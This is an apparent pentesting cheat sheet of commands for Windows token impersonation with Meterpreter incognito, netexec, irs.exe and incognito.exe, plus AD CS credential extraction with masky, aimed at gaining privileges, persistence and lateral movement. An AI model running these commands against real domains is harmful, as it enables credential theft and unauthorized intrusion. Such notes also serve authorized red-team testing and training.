# Token Manipulation

## Tools: Meterpreter , CrackMapExec/Netexec , irs.exe , incognito.exe , masky

#### 1) Meterpreter

 - use incognito

 - impersonate_token DOMAIN\\USER

#### 2) CrackMapExec/Netexec

 - netexec smb IP -u USER -p PASSWORD -M impersonate

#### 3) irs.exe

 - irs.exe list

 - irs.exe exec --pid PID --command COMMAND

#### 4) Incognito.exe

 - .\incognito.exe list_tokens -u

 - ./incognito.exe execute -c "DOMAIN\USER" powershell.exe

### These techniques can give us further privileged ACLs to gain more cleartext credentials or creating persistent mechanisms

## Extract credentials with certificate authentication (ADCS required)

 - masky -d DOMAIN -u USER (-p PASSWORD || -k || -H HASH) -ca CERTIFICATE_AUTHORITY IP

### With this technique, we can perform Lateral movement via NTLM, Kerberos or Certificate.
